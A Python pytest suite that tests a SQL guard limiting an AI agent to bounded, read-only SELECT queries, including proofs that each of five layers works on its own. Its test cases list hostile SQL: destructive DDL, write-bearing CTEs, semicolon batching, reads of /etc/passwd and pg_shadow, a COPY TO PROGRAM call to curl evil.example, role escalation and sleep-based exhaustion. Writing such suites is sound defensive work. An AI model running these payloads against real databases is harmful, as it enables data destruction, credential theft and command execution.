"""Adversarial suite for the agent's SQL guard (SPEC.md §10.3), written
before the implementation.

Governing principle, the same one that shaped the entity-resolution golden
set: a query that gets through is far worse than a query wrongly refused.
Every case here is load-bearing.

§10.3 mandates five layers and says layer 1 "is the layer that actually
protects you; the rest are defence in depth". Two of the five are enforced
by the database rather than by Python:

    readonly_role      database  - grants, on views not base tables
    single_select      python    - sqlglot AST, one SELECT expression
    statement_timeout  database  - SET LOCAL statement_timeout = '5s'
    forced_limit       python    - AST rewrite appending LIMIT 1000
    single_statement   python    - exactly one statement, no batching

So this file has two halves. The Python layers are tested with no database
and run everywhere. The database layers need the replica and the read-only
role, and skip cleanly without them - with the same reasoning as
tests/models/test_resolve_outcomes.py: a check that can only run on one
machine still has to run somewhere on every push, so the Python half carries
the load in CI and the database half confronts the real grants.

THE NON-VACUITY PROOFS ARE THE POINT. "Five layers" is a claim, and a
five-layer defence where layer 2 never fires alone is a four-layer defence
with a comment. For each layer there is a query that ONLY that layer
rejects, proven twice: rejected with every layer active, and admitted when
that one layer is disabled. The `skip` seam exists for exactly this and is
itself guarded - see test_the_production_entry_point_never_skips_a_layer.
"""

from __future__ import annotations

import pytest

from agent_tools.sql_guard import LAYERS, MAX_ROWS, GuardRejection, check

ALL_LAYER_NAMES = {layer.name for layer in LAYERS}


def _rejects(sql: str, *, skip: frozenset[str] = frozenset()) -> GuardRejection:
    """Assert the guard refuses, and hand back the rejection for inspection."""
    with pytest.raises(GuardRejection) as excinfo:
        check(sql, skip=skip)
    return excinfo.value


# --- the layer registry ---------------------------------------------------


def test_the_guard_declares_exactly_the_five_layers_the_spec_mandates():
    """§10.3 names five. If the implementation grows or loses one, this test
    is where that becomes a decision instead of a drift."""
    assert ALL_LAYER_NAMES == {
        "readonly_role",
        "single_select",
        "statement_timeout",
        "forced_limit",
        "single_statement",
    }


def test_every_layer_declares_where_it_is_enforced():
    """A layer enforced by the database cannot be proven by a unit test, and
    knowing which is which is what stops someone 'covering' layer 1 with a
    Python assertion that proves nothing about the grants."""
    for layer in LAYERS:
        assert layer.enforced_by in {"python", "database"}
    python_layers = {layer.name for layer in LAYERS if layer.enforced_by == "python"}
    assert python_layers == {"single_select", "forced_limit", "single_statement"}


# --- 1. the ordinary case must still work ---------------------------------


def test_a_plain_select_is_admitted_and_gains_a_limit():
    out = check("SELECT bowler, count(*) FROM agent_deliveries GROUP BY bowler")
    assert "LIMIT" in out.upper()
    assert "agent_deliveries" in out


def test_an_explicit_smaller_limit_is_left_alone():
    """Forcing a LIMIT means bounding the result, not overriding the caller's
    intent when they already asked for less."""
    out = check("SELECT * FROM agent_deliveries LIMIT 10")
    assert "10" in out
    assert "1000" not in out


def test_a_cte_that_only_reads_is_admitted():
    out = check(
        "WITH per_bowler AS (SELECT bowler, count(*) AS n FROM agent_deliveries GROUP BY bowler) "
        "SELECT * FROM per_bowler WHERE n > 100"
    )
    assert "per_bowler" in out


# --- 2. writes, in every disguise -----------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "DROP TABLE deliveries",
        "DROP VIEW agent_deliveries",
        "DELETE FROM deliveries",
        "UPDATE deliveries SET runs_batter = 0",
        "INSERT INTO deliveries (match_id) VALUES (1)",
        "TRUNCATE deliveries",
        "ALTER TABLE deliveries ADD COLUMN x INT",
        "CREATE TABLE evil (id INT)",
        "GRANT SELECT ON deliveries TO PUBLIC",
        "REVOKE SELECT ON agent_deliveries FROM agent_ro",
        "COMMENT ON TABLE deliveries IS 'x'",
    ],
)
def test_every_write_or_ddl_statement_is_rejected(sql):
    assert _rejects(sql).layer == "single_select"


@pytest.mark.parametrize(
    "sql",
    [
        # The classic: hide the write inside a CTE so the outermost node is
        # a SELECT. Postgres executes data-modifying CTEs.
        "WITH x AS (INSERT INTO deliveries (match_id) VALUES (1) RETURNING match_id) SELECT * FROM x",
        "WITH x AS (DELETE FROM deliveries RETURNING match_id) SELECT * FROM x",
        "WITH x AS (UPDATE deliveries SET runs_batter = 0 RETURNING match_id) SELECT * FROM x",
    ],
)
def test_a_write_wrapped_in_a_cte_is_rejected(sql):
    """The outermost expression is a SELECT, so 'is it a SELECT?' asked
    naively says yes. The guard has to look inside."""
    assert _rejects(sql).layer == "single_select"


def test_select_into_is_rejected():
    """SELECT ... INTO creates a table. It parses as a Select."""
    _rejects("SELECT * INTO evil FROM agent_deliveries")


@pytest.mark.parametrize("sql", ["SELECT * FROM agent_deliveries FOR UPDATE",
                                 "SELECT * FROM agent_deliveries FOR NO KEY UPDATE"])
def test_row_locking_is_rejected(sql):
    """A read that takes write locks is not a read."""
    _rejects(sql)


# --- 3. batching and comments ---------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1; DROP TABLE deliveries",
        "SELECT 1; SELECT 2",
        "SELECT 1;DROP TABLE deliveries;--",
        "SELECT 1 ; ; SELECT 2",
    ],
)
def test_semicolon_batching_is_rejected(sql):
    assert _rejects(sql).layer == "single_statement"


def test_a_single_trailing_semicolon_is_not_batching():
    """Rejecting this would refuse the most ordinary SQL anyone writes."""
    out = check("SELECT count(*) FROM agent_deliveries;")
    assert "LIMIT" in out.upper()


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1 -- ; DROP TABLE deliveries",
        "SELECT 1 /* ; DROP TABLE deliveries */",
        "SELECT /*! 1 */ 1",
        "SELECT 1; -- harmless looking",
    ],
)
def test_comment_injection_cannot_smuggle_a_second_statement(sql):
    """Either the comment is inert and the query is a plain SELECT, or it
    hides a batch and layer 5 fires. What must never happen is the comment
    being stripped into an executable second statement."""
    try:
        out = check(sql)
    except GuardRejection as rejection:
        assert rejection.layer in ALL_LAYER_NAMES
    else:
        assert "DROP" not in out.upper()


# --- 4. reaching outside the views ----------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM pg_catalog.pg_tables",
        "SELECT * FROM information_schema.columns",
        "SELECT 1 UNION SELECT count(*) FROM pg_catalog.pg_roles",
        "SELECT (SELECT count(*) FROM pg_shadow)",
        "SELECT * FROM pg_stat_activity",
    ],
)
def test_system_catalogue_access_is_rejected(sql):
    """Reconnaissance. The role cannot read most of these anyway, but the
    guard should not be the reason we find that out."""
    _rejects(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM deliveries",
        "SELECT * FROM public.deliveries",
        "SELECT (SELECT count(*) FROM match_states)",
        "SELECT * FROM agent_deliveries JOIN players ON true",
        "SELECT * FROM unresolved_entities",
        "SELECT * FROM player_aliases",
    ],
)
def test_reaching_a_base_table_outside_the_views_is_rejected(sql):
    """Layer 1 stops these at the database. The guard stopping them first
    means the caller never learns which tables exist."""
    _rejects(sql)


# --- 5. resource exhaustion -----------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT pg_sleep(10)",
        "SELECT pg_sleep_for('10 seconds')",
        "SELECT * FROM generate_series(1, 100000000)",
        "SELECT repeat('x', 1000000000)",
    ],
)
def test_resource_exhaustion_functions_are_rejected(sql):
    """The statement timeout is the real defence, but a query whose entire
    purpose is to burn the budget should not need to reach the database."""
    _rejects(sql)


def test_a_cartesian_product_is_still_bounded_by_the_forced_limit():
    """Not rejected - a self-join is legitimate - but it must come back
    with a LIMIT so it cannot stream 2.4M x 2.4M rows."""
    out = check("SELECT * FROM agent_deliveries a, agent_deliveries b")
    assert "LIMIT" in out.upper()


# --- 5b. the truncation probe ---------------------------------------------
#
# Layer 4 caps the result at MAX_ROWS, and a cap nobody is told about is how
# a truncated GROUP BY becomes a confident wrong total. Counting rows cannot
# detect it: a complete result of exactly MAX_ROWS and one cut off at
# MAX_ROWS are both 1000 rows. So `probe_extra_row` asks for one more and
# the route reports the difference.


def test_the_probe_asks_for_one_row_past_the_ceiling():
    out = check("SELECT batter FROM agent_deliveries", probe_extra_row=True)
    assert f"LIMIT {MAX_ROWS + 1}" in out.upper()


def test_the_probe_is_off_by_default_so_the_emitted_sql_is_unchanged():
    """Every other test in this file asserts on the default output. The probe
    is opt-in precisely so it cannot quietly move that contract."""
    out = check("SELECT batter FROM agent_deliveries")
    assert f"LIMIT {MAX_ROWS}" in out.upper()
    assert f"LIMIT {MAX_ROWS + 1}" not in out.upper()


def test_a_caller_limit_equal_to_the_ceiling_is_probed_too():
    """`LIMIT 1000` written by the agent has the same silent-truncation
    problem as a limit the guard imposed, so it gets the same treatment."""
    out = check(f"SELECT batter FROM agent_deliveries LIMIT {MAX_ROWS}", probe_extra_row=True)
    assert f"LIMIT {MAX_ROWS + 1}" in out.upper()


def test_a_smaller_caller_limit_is_left_alone():
    """A deliberate "top 10" must not report itself as truncated. The caller
    set that limit and knows it."""
    out = check("SELECT batter FROM agent_deliveries LIMIT 10", probe_extra_row=True)
    assert "LIMIT 10" in out.upper()
    assert f"LIMIT {MAX_ROWS + 1}" not in out.upper()


def test_the_probe_never_raises_the_cap_on_what_is_returned():
    """The probe row exists to be counted, not served. Layer 4's guarantee is
    about what reaches the caller, and routes slice the extra row off - so a
    probe that leaked it would weaken the layer it reports on."""
    from agent_tools.routes import MAX_ROWS as route_max

    assert route_max == MAX_ROWS


# --- 6. file and privilege access -----------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_read_binary_file('/etc/passwd')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_get(1)",
        "SELECT pg_ls_dir('/')",
        "COPY agent_deliveries TO '/tmp/out.csv'",
        "COPY (SELECT 1) TO PROGRAM 'curl evil.example'",
    ],
)
def test_file_and_large_object_access_is_rejected(sql):
    _rejects(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SET ROLE postgres",
        "SET SESSION AUTHORIZATION postgres",
        "RESET ROLE",
        "SET statement_timeout = '1h'",
        "SET LOCAL statement_timeout = '1h'",
        "ALTER ROLE agent_ro SUPERUSER",
    ],
)
def test_privilege_escalation_and_session_tampering_is_rejected(sql):
    """SET is the interesting one: the role is permitted to run it, so
    layer 1 does not stop it, and it would defeat layer 3."""
    _rejects(sql)


@pytest.mark.parametrize("sql", ["EXPLAIN ANALYZE SELECT * FROM agent_deliveries",
                                 "EXPLAIN (ANALYZE) SELECT 1"])
def test_explain_analyze_is_rejected(sql):
    """EXPLAIN ANALYZE executes the statement. A guard that lets it through
    because 'EXPLAIN only plans' is wrong about what ANALYZE does."""
    _rejects(sql)


# --- 7. malformed input ---------------------------------------------------


@pytest.mark.parametrize("sql", ["", "   ", "\n\t ", "NOT SQL AT ALL", "SELECT FROM WHERE"])
def test_unparseable_input_is_rejected_rather_than_passed_through(sql):
    """Whatever sqlglot does with nonsense, the guard must not hand it to
    the database to find out."""
    _rejects(sql)


def test_a_rejection_carries_no_detail_for_the_caller():
    """§10.3 plus Decision 5: an error naming the table that does not exist
    is free reconnaissance. The layer is recorded for the server log; the
    public message says nothing."""
    rejection = _rejects("SELECT * FROM deliveries")
    assert rejection.layer  # recorded internally
    public = rejection.public_message()
    assert "deliveries" not in public
    assert rejection.layer not in public
    assert public == GuardRejection.PUBLIC_MESSAGE


def test_every_rejection_reason_produces_the_same_public_message():
    """Uniform to the caller, whatever the cause - otherwise the message
    itself is an oracle telling an attacker which layer they tripped."""
    messages = {
        _rejects(sql).public_message()
        for sql in (
            "DROP TABLE deliveries",
            "SELECT 1; SELECT 2",
            "SELECT pg_sleep(10)",
            "SELECT * FROM pg_catalog.pg_tables",
            "NOT SQL AT ALL",
        )
    }
    assert len(messages) == 1


# --- 8. THE NON-VACUITY PROOFS -------------------------------------------
#
# For each Python-enforced layer: one query that only that layer rejects,
# shown rejected with everything on and admitted with that layer off. The
# database-enforced layers get the same treatment in
# test_sql_guard_database.py, where the grants are real.


def test_only_the_single_select_layer_rejects_a_SET_statement():
    sql = "SET statement_timeout = '1h'"
    assert _rejects(sql).layer == "single_select"
    # With that one layer disabled it sails through every other check:
    # one statement, nothing to limit.
    out = check(sql, skip=frozenset({"single_select"}))
    assert "statement_timeout" in out


def test_only_the_forced_limit_layer_bounds_an_unbounded_scan():
    sql = "SELECT * FROM agent_deliveries"
    bounded = check(sql)
    assert "LIMIT" in bounded.upper()
    # Disabled, the same query is admitted unbounded - which is the whole
    # reason the layer exists on a 2.4M-row view.
    unbounded = check(sql, skip=frozenset({"forced_limit"}))
    assert "LIMIT" not in unbounded.upper()


def test_only_the_single_statement_layer_rejects_a_batch_of_two_selects():
    sql = "SELECT 1; SELECT 2"
    assert _rejects(sql).layer == "single_statement"
    # Each statement is individually a valid, limitable SELECT - so every
    # other layer is satisfied and only the count check stands between this
    # and two executed statements.
    out = check(sql, skip=frozenset({"single_statement"}))
    assert out.upper().count("SELECT") == 2


def test_the_production_entry_point_never_skips_a_layer():
    """The `skip` seam exists for the proofs above and must not leak into
    the served path. Same shape as the anti-vacuity checks in
    tests/db/test_float_boundary.py: the test asserts the thing it relies
    on is still true."""
    import inspect

    from agent_tools import routes

    source = inspect.getsource(routes)
    assert "skip=" not in source, (
        "agent_tools/routes.py passes `skip` to the guard. That parameter is a "
        "testing seam for the non-vacuity proofs; using it in the served path "
        "disables a layer in production."
    )
